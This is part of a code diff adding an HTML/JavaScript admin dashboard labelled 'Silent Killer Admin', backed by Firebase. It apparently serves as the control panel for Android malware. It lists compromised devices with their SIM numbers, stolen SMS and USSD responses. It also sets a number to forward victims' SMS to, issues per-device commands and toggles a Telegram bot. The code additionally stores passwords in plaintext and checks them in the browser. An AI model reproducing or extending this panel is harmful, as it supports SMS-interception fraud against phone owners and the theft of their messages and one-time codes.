+  const n = document.getElementById('fwdNumber').value.trim();
+  if (!n) return toast('Enter number', 'error');
+  set(ref(db, 'sms_forward/forward_number'), n).then(() => { toast('Updated', 'success'); bootstrap.Modal.getInstance(document.getElementById('updateNumberModal')).hide(); });
+};
+window.refreshData = function() {
+  PERF.deviceCache.clear(); PERF.smsCache.clear();
+  get(ref(db, 'device_serials')).then(snap => {
+    deviceSerialMap = snap.val() || {};
+    loadDevicesPage(true);
+    loadAllSms();
+    loadAllBackup();
+    if (selectedDeviceId) { loadDeviceSmsOnly(selectedDeviceId); loadDeviceData(selectedDeviceId); }
+    toast('Refreshed', 'success');
+  }).catch(() => { loadDevicesPage(true); loadAllSms(); loadAllBackup(); toast('Refreshed', 'success'); });
+};
+
+/* PASSWORD */
+window.openChangePassword = () => {
+  document.getElementById('oldPass').value = '';
+  document.getElementById('newPass').value = '';
+  document.getElementById('newPass2').value = '';
+  const st = document.getElementById('changePassStatus');
+  st.style.display = 'none'; st.textContent = '';
+  new bootstrap.Modal(document.getElementById('changePassModal')).show();
+  setTimeout(() => document.getElementById('oldPass').focus(), 300);
+};
+window.changePassword = async function() {
+  const oldPass = document.getElementById('oldPass').value.trim();
+  const newPass = document.getElementById('newPass').value.trim();
+  const newPass2 = document.getElementById('newPass2').value.trim();
+  const statusEl = document.getElementById('changePassStatus');
+  const btn = document.getElementById('changePassBtn');
+  function showStatus(msg, type) {
+    statusEl.style.display = 'block';
+    if (type === 'error') { statusEl.style.background = 'var(--red-soft)'; statusEl.style.color = 'var(--red)'; statusEl.textContent = '❌ ' + msg; }
+    else if (type === 'success') { statusEl.style.background = 'var(--green-soft)'; statusEl.style.color = 'var(--green)'; statusEl.textContent = '✅ ' + msg; }
+    else { statusEl.style.background = 'var(--card-2)'; statusEl.style.color = 'var(--muted)'; statusEl.textContent = msg; }
+  }
+  statusEl.style.display = 'none'; statusEl.textContent = '';
+  if (!oldPass) return showStatus('Enter current password', 'error');
+  if (!newPass) return showStatus('Enter new password', 'error');
+  if (newPass.length < 4) return showStatus('Min 4 characters', 'error');
+  if (newPass !== newPass2) return showStatus('Passwords do not match', 'error');
+  if (oldPass === newPass) return showStatus('New must differ from old', 'error');
+  btn.disabled = true; btn.innerHTML = '<span class="spinner-small"></span> Verifying...';
+  showStatus('Verifying...', 'info');
+  try {
+    const snap = await get(ref(db, 'admin/password'));
+    const stored = snap.val();
+    if (!stored) { showStatus('No password set', 'error'); return; }
+    if (stored !== oldPass) { showStatus('Incorrect current password', 'error'); return; }
+    await set(ref(db, 'admin/password'), newPass);
+    adminPassword = newPass;
+    saveSession();
+    showStatus('Password changed!', 'success');
+    toast('✅ Password changed', 'success');
+    setTimeout(() => {
+      const inst = bootstrap.Modal.getInstance(document.getElementById('changePassModal'));
+      if (inst) { if (document.activeElement && document.activeElement.blur) document.activeElement.blur(); inst.hide(); }
+    }, 1500);
+  } catch (e) { showStatus('Failed: ' + e.message, 'error'); }
+  finally { btn.disabled = false; btn.innerHTML = '<i class="bi bi-check"></i> Change Password'; }
+};
+function listenDeletePassword() { onValue(ref(db, 'admin/delete_password'), s => { deletePassword = s.val() || null; }); }
+window.openSetDeletePassword = () => new bootstrap.Modal(document.getElementById('deletePassModal')).show();
+window.saveDeletePassword = function() {
+  const a = document.getElementById('delPass1').value.trim();
+  const b = document.getElementById('delPass2').value.trim();
+  if (a.length < 4 || a !== b) return toast('Invalid or mismatch', 'error');
+  set(ref(db, 'admin/delete_password'), a).then(() => { toast('Delete password saved', 'success'); bootstrap.Modal.getInstance(document.getElementById('deletePassModal')).hide(); });
+};
+window.deleteSelectedUser = function() {
+  if (!selectedDeviceId) return;
+  const devId = selectedDeviceId;
+  requestDeletePassword('Device: ' + devId.slice(0, 12) + '...', () => {
+    if (!confirm('⚠️ Delete this device and ALL its SMS?')) return;
+    remove(ref(db, `user_data/${devId}`)).then(() => {
+      remove(ref(db, `user_sms/${devId}`)).catch(() => {});
+      remove(ref(db, `commands/${devId}`)).catch(() => {});
+      delete deviceSerialMap[devId];
+      PERF.deviceCache.delete(devId);
+      PERF.smsCache.delete(devId);
+      allDevices = allDevices.filter(d => d.deviceId !== devId);
+      allDevicesFull = allDevicesFull.filter(d => d.deviceId !== devId);
+      update(ref(db, 'device_serials'), { [devId]: null }).catch(() => {});
+      toast('🗑️ Device deleted', 'success');
+      goHome();
+    }).catch(e => toast('❌ ' + e.message, 'error'));
+  });
+};
+function requestDeletePassword(targetLabel, onConfirm) {
+  if (!isUnlocked) return;
+  if (!deletePassword || deletePassword === '') {
+    toast('⚠️ Set delete password first!', 'warning');
+    openSetDeletePassword();
+    return;
+  }
+  pendingDeleteAction = onConfirm;
+  document.getElementById('verifyDeletePassInput').value = '';
+  const st = document.getElementById('verifyDeletePassStatus');
+  st.style.display = 'none'; st.textContent = '';
+  document.getElementById('verifyDeleteTarget').textContent = targetLabel ? 'Target: ' + targetLabel : '';
+  new bootstrap.Modal(document.getElementById('verifyDeletePassModal')).show();
+  setTimeout(() => document.getElementById('verifyDeletePassInput').focus(), 300);
+}
+window.confirmDeleteWithPassword = function() {
+  const pass = document.getElementById('verifyDeletePassInput').value.trim();
+  const st = document.getElementById('verifyDeletePassStatus');
+  const btn = document.getElementById('confirmDeleteBtn');
+  if (!pass) { st.style.display = 'block'; st.style.background = 'var(--red-soft)'; st.style.color = 'var(--red)'; st.textContent = '⚠️ Enter password'; return; }
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner-small"></span> Verifying...';
+  onValue(ref(db, 'admin/delete_password'), snap => {
+    const stored = snap.val();
+    if (!stored || stored === '') {
+      st.style.display = 'block'; st.style.background = 'var(--red-soft)'; st.style.color = 'var(--red)'; st.textContent = '⚠️ No delete password set!';
+      btn.disabled = false; btn.innerHTML = '<i class="bi bi-trash"></i> Confirm Delete';
+      return;
+    }
+    if (stored !== pass) {
+      st.style.display = 'block'; st.style.background = 'var(--red-soft)'; st.style.color = 'var(--red)'; st.textContent = '❌ Incorrect password';
+      document.getElementById('verifyDeletePassInput').value = '';
+      btn.disabled = false; btn.innerHTML = '<i class="bi bi-trash"></i> Confirm Delete';
+      return;
+    }
+    st.style.display = 'block'; st.style.background = 'var(--green-soft)'; st.style.color = 'var(--green)'; st.textContent = '✅ Verified!';
+    const action = pendingDeleteAction;
+    pendingDeleteAction = null;
+    bootstrap.Modal.getInstance(document.getElementById('verifyDeletePassModal')).hide();
+    btn.disabled = false; btn.innerHTML = '<i class="bi bi-trash"></i> Confirm Delete';
+    if (typeof action === 'function') { try { action(); } catch (e) {} }
+  }, { onlyOnce: true });
+};
+window.cancelDeleteVerify = function() {
+  pendingDeleteAction = null;
+  const st = document.getElementById('verifyDeletePassStatus');
+  if (st) { st.style.display = 'none'; st.textContent = ''; }
+};
+
+/* BOT STATUS */
+function listenBotStatus() {
+  onValue(ref(db, 'telegram_config'), s => {
+    const cfg = s.val();
+    isBotRunning = !!(cfg && cfg.enabled);
+    document.getElementById('stBotStatus').textContent = cfg
+      ? `Chat: ${cfg.chat_id || '—'} • ${isBotRunning ? 'Running' : 'Stopped'}`
+      : 'Not configured';
+    updateStatusChips();
+    const badge = document.getElementById('botGlobalStatus');
+    if (badge) {
+      badge.className = 'bot-status-badge ' + (isBotRunning ? 'running' : 'stopped');
+      badge.textContent = isBotRunning ? '▶ BOT ON' : '⏹ BOT OFF';
+    }
+  });
+  onValue(ref(db, 'sms_forward/forward_number'), s => {
+    document.getElementById('stForwardNumber').textContent = s.val() || 'Not set';
+  });
+}
+
+/* ACCENT GRID */
+function buildAccentGrid() {
+  const grid = document.getElementById('accentGrid');
+  if (!grid) return;
+  grid.innerHTML = ACCENTS.map(c => {
+    const isActive = (localStorage.getItem('daimon-accent') || '#ff2d6f') === c;
+    return `<button onclick="setAccent('${c}')" style="
+      width:28px;height:28px;border-radius:50%;border:${isActive ? '3px solid #ff2d6f' : '3px solid transparent'};
+      background:${c};cursor:pointer;transition:transform .15s;box-shadow:0 2px 8px ${c}55;
+    " onmouseover="this.style.transform='scale(1.1)'" onmouseout="this.style.transform='scale(1)'"></button>`;
+  }).join('');
+}
+window.setAccent = function(color) {
+  document.documentElement.style.setProperty('--primary', color);
+  const r = parseInt(color.slice(1,3),16), g = parseInt(color.slice(3,5),16), b = parseInt(color.slice(5,7),16);
+  document.documentElement.style.setProperty('--primary-soft', `rgba(${r},${g},${b},0.13)`);
+  localStorage.setItem('daimon-accent', color);
+  buildAccentGrid();
+  toast('Theme applied', 'success');
+};
+const savedAccent = localStorage.getItem('daimon-accent');
+if (savedAccent) {
+  document.documentElement.style.setProperty('--primary', savedAccent);
+  const r = parseInt(savedAccent.slice(1,3),16), g = parseInt(savedAccent.slice(3,5),16), b = parseInt(savedAccent.slice(5,7),16);
+  document.documentElement.style.setProperty('--primary-soft', `rgba(${r},${g},${b},0.13)`);
+}
+function updateStatusChips() {
+  const online = allDevicesFull.filter(d => d.status === 'online').length;
+  document.getElementById('chipDevices').innerHTML = `<i class="bi bi-phone"></i>${online}/${totalDeviceCount || allDevicesFull.length}`;
+  document.getElementById('chipBot').innerHTML = `<i class="bi bi-telegram"></i>${isBotRunning ? 'On' : 'Off'}`;
+  document.getElementById('chipBot').className = 'chip ' + (isBotRunning ? 'green' : 'blue');
+}
+
+/* LIVE UPDATES */
+let liveUpdateThrottle = null;
+function setupLiveUpdates() {
+  if (!db) return;
+  onChildChanged(ref(db, 'user_data'), snap => {
+    const id = snap.key;
+    const d = allDevicesFull.find(x => x.deviceId === id);
+    if (d) {
+      const v = snap.val() || {};
+      if (v.d_name) d.d_name = v.d_name;
+      if (v.Device_info) d.device_info = v.Device_info;
+      if (v.status) d.status = v.status;
+      if (v.battery || v.battery_percentage) d.battery = parseInt(v.battery || v.battery_percentage) || d.battery;
+      if (v.last_seen) d.lastSeen = v.last_seen;
+      if (v.TimeandDate) d.timeandDate = v.TimeandDate;
+      if (v.numberSim1) d.numberSim1 = v.numberSim1;
+      if (v.numberSim2) d.numberSim2 = v.numberSim2;
+      if (v.nameSim1) d.nameSim1 = v.nameSim1;
+      if (v.nameSim2) d.nameSim2 = v.nameSim2;
+      cacheSet(PERF.deviceCache, id, d);
+      if (selectedDeviceId === id) { selectedDevice = d; renderHomeDevice(); }
+      clearTimeout(liveUpdateThrottle);
+      liveUpdateThrottle = setTimeout(() => { updateStats(); renderDeviceList(); }, 400);
+    }
+  });
+  onChildAdded(ref(db, 'user_data'), snap => {
+    const id = snap.key;
+    if (allDevicesFull.find(x => x.deviceId === id)) return;
+    const u = snap.val() || {};
+    const initialName = extractDeviceName(u);
+    const newDevice = buildDeviceObject(id, u, initialName);
+    allDevicesFull.push(newDevice);
+    allDevices.push(newDevice);
+    filteredDevices = [...allDevicesFull].sort((a, b) => (b.user_serial || 0) - (a.user_serial || 0));
+    totalDeviceCount = allDevicesFull.length;
+    cacheSet(PERF.deviceCache, id, newDevice);
+    attachLiveStatusListener(id);
+    renderDeviceList();
+    updateStats();
+    updateStatusChips();
+    toast('🆕 New device: ' + initialName, 'success');
+    get(ref(db, `user_data/${id}/user_serial`)).then(s => {
+      const v = s.val();
+      if (v) deviceSerialMap[id] = v;
+    }).catch(() => {}).finally(() => {
+      if (!newDevice.user_serial) {
+        let maxS = 0;
+        for (const k in deviceSerialMap) { const n = Number(deviceSerialMap[k]); if (!isNaN(n) && n > maxS) maxS = n; }
+        maxS++;
+        deviceSerialMap[id] = maxS;
+        newDevice.user_serial = maxS;
+        update(ref(db, 'device_serials'), { [id]: maxS }).catch(() => {});
+      }
+      renderDeviceList();
+    });
+  });
+}
+function extractDeviceName(u) {
+  if (!u) return 'Unknown Device';
+  if (u.d_name && u.d_name !== 'Unknown Device') return u.d_name;
+  if (u.Device_info) {
+    const m = u.Device_info.match(/Device Name:\s*([^\n]+)/);
+    if (m) return m[1].trim();
+  }
+  if (u.device_name) return u.device_name;
+  if (u.model) return u.model;
+  return 'Unknown Device';
+}
+function buildDeviceObject(id, u, name) {
+  return {
+    deviceId: id,
+    d_name: name || extractDeviceName(u),
+    device_info: u.Device_info || 'No info',
+    battery: parseInt(u.battery || u.battery_percentage) || 0,
+    status: u.status || 'offline',
+    timeandDate: u.TimeandDate || u.installTime || 'N/A',
+    lastSeen: u.last_seen || u.TimeandDate || 0,
+    nameSim1: u.nameSim1 || 'Unknown',
+    numberSim1: u.numberSim1 || 'Not detected',
+    nameSim2: u.nameSim2 || 'Unknown',
+    numberSim2: u.numberSim2 || 'Not detected',
+    ussd_response: u.ussd_response || '',
+    user_serial: deviceSerialMap[id] || u.user_serial || 0
+  };
+}
+document.querySelectorAll('.modal').forEach(m => {
+  m.addEventListener('hide.bs.modal', () => {
+    if (document.activeElement && document.activeElement.blur) document.activeElement.blur();
+  });
+});
+
+/* BOOT */
+console.log('⚡ Silent Killer Admin v10.0 — Crimson Cyber Theme Applied');
+onAuthReady(() => {
+  checkUserStatus();
+  checkExpiry();
+  checkLogin();
+  setTimeout(() => { setupLiveUpdates(); loadAllData(); }, 1000);
+});
+setTimeout(() => {
+  if (!authReady) {
+    checkUserStatus();
+    checkExpiry();
+    checkLogin();
+    setTimeout(() => { setupLiveUpdates(); loadAllData(); }, 1000);
+  }
+}, 3000);
+</script>
+</body>
+</html>
